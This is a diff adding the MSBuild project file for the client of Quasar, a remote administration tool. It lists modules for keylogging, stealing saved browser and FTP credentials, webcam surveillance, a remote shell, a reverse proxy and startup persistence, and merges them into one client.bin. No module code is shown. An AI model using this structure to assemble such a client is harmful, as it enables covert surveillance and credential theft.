@@ -1,0 +1,201 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>8.0.30703</ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{9F5CF56A-DDB2-4F40-AB99-2A1DC47588E1}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>xClient</RootNamespace>
+    <AssemblyName>Client</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\Bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\Bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <DebugSymbols>false</DebugSymbols>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>xClient.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Gma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\MouseKeyHook.5.6.0\lib\net40\Gma.System.MouseKeyHook.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="protobuf-net, Version=2.4.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67, processorArchitecture=MSIL">
+      <HintPath>..\packages\protobuf-net.2.4.0\lib\net40\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Configuration" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Core\AForge\Video.DirectShow\CameraControlProperty.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\FilterInfo.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\FilterInfoCollection.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IAMCameraControl.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IAMCrossbar.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IAMStreamConfig.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IAMVideoControl.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IBaseFilter.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\ICaptureGraphBuilder2.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\ICreateDevEnum.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IEnumFilters.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IEnumPins.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IFilterGraph.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IFilterGraph2.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IGraphBuilder.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IMediaControl.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IMediaEventEx.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IPin.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IPropertyBag.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\IReferenceClock.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\ISampleGrabber.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\ISampleGrabberCB.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\ISpecifyPropertyPages.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\Structures.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\Uuids.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Internals\Win32.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\PhysicalConnectorType.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\Uuids.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\VideoCapabilities.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\VideoCaptureDevice.cs" />
+    <Compile Include="Core\AForge\Video.DirectShow\VideoInput.cs" />
+    <Compile Include="Core\AForge\Video\IVideoSource.cs" />
+    <Compile Include="Core\AForge\Video\VideoEvents.cs" />
+    <Compile Include="Core\Commands\RegistryHandler.cs" />
+    <Compile Include="Core\Commands\TcpConnectionsHandler.cs" />
+    <Compile Include="Core\Commands\WebcamHandler.cs" />
+    <Compile Include="Core\Data\ClientData.cs" />
+    <Compile Include="Core\Data\GeoInformation.cs" />
+    <Compile Include="Core\Helper\CryptographyHelper.cs" />
+    <Compile Include="Core\Helper\MutexHelper.cs" />
+    <Compile Include="Core\Helper\WindowsAccountHelper.cs" />
+    <Compile Include="Core\Helper\FileHelper.cs" />
+    <Compile Include="Core\Helper\FormatHelper.cs" />
+    <Compile Include="Core\Helper\HostHelper.cs" />
+    <Compile Include="Core\Helper\NativeMethodsHelper.cs" />
+    <Compile Include="Core\Helper\PlatformHelper.cs" />
+    <Compile Include="Core\Helper\RegistryKeyHelper.cs" />
+    <Compile Include="Core\Helper\ScreenHelper.cs" />
+    <Compile Include="Core\Helper\DevicesHelper.cs" />
+    <Compile Include="Core\Helper\SystemHelper.cs" />
+    <Compile Include="Core\Installation\ClientInstaller.cs" />
+    <Compile Include="Core\Installation\ClientUninstaller.cs" />
+    <Compile Include="Core\Installation\ClientUpdater.cs" />
+    <Compile Include="Core\Installation\Startup.cs" />
+    <Compile Include="Core\Networking\Client.cs" />
+    <Compile Include="Core\Commands\CommandHandler.cs" />
+    <Compile Include="Core\Commands\ConnectionHandler.cs" />
+    <Compile Include="Core\Commands\FileHandler.cs" />
+    <Compile Include="Core\Commands\MiscHandler.cs" />
+    <Compile Include="Core\Commands\SurveillanceHandler.cs" />
+    <Compile Include="Core\Commands\SystemHandler.cs" />
+    <Compile Include="Core\Compression\SafeQuickLZ.cs" />
+    <Compile Include="Core\Cryptography\AES.cs" />
+    <Compile Include="Core\Cryptography\SHA256.cs" />
+    <Compile Include="Core\Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Core\Networking\PacketHandler.cs" />
+    <Compile Include="Core\Networking\QuasarClient.cs" />
+    <Compile Include="Core\Recovery\FtpClients\FileZilla.cs" />
+    <Compile Include="Core\Recovery\FtpClients\WinSCP.cs" />
+    <Compile Include="Core\Registry\RegistryEditor.cs" />
+    <Compile Include="Core\Registry\RegistrySeeker.cs" />
+    <Compile Include="Core\Data\Host.cs" />
+    <Compile Include="Core\Utilities\HostsManager.cs" />
+    <Compile Include="Core\Utilities\NativeMethods.cs" />
+    <Compile Include="Core\Extensions\SocketExtensions.cs" />
+    <Compile Include="Core\Helper\KeyloggerHelper.cs" />
+    <Compile Include="Core\Utilities\Shell.cs" />
+    <Compile Include="Core\Recovery\Browsers\Chrome.cs" />
+    <Compile Include="Core\Recovery\Browsers\Firefox.cs" />
+    <Compile Include="Core\Recovery\Utilities\Chromium.cs" />
+    <Compile Include="Core\Recovery\Utilities\JsonUtil.cs" />
+    <Compile Include="Core\Data\RecoveredAccount.cs" />
+    <Compile Include="Core\Recovery\Utilities\SQLiteHandler.cs" />
+    <Compile Include="Core\Recovery\Browsers\InternetExplorer.cs" />
+    <Compile Include="Core\Recovery\Browsers\Opera.cs" />
+    <Compile Include="Core\Recovery\Browsers\Yandex.cs" />
+    <Compile Include="Core\ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="Core\ReverseProxy\ReverseProxyCommandHandler.cs" />
+    <Compile Include="Core\Helper\GeoLocationHelper.cs" />
+    <Compile Include="Core\Utilities\Keylogger.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Config\Settings.cs" />
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.manifest" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Quasar.Common\Quasar.Common.csproj">
+      <Project>{c7c363ba-e5b6-4e18-9224-39bc8da73172}</Project>
+      <Name>Quasar.Common</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent Condition="'$(OS)' == 'Windows_NT' ">copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
+    <PostBuildEvent Condition="'$(OS)' != 'Windows_NT' ">cp "$(TargetPath)" "$(TargetDir)client.bin"</PostBuildEvent>
+  </PropertyGroup>
+  <PropertyGroup>
+    <PostBuildEvent>"$(SolutionDir)packages\ILMerge.2.14.1208\tools\ILMerge.exe" /out:"$(TargetDir)$(TargetName).all.exe" "$(TargetPath)" "$(TargetDir)Gma.System.MouseKeyHook.dll" "$(TargetDir)Quasar.Common.dll" /target:WinExe /wildcards /internalize
+copy "$(TargetDir)$(TargetName).all.exe" "$(TargetDir)client.bin" /Y</PostBuildEvent>
+  </PropertyGroup>
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
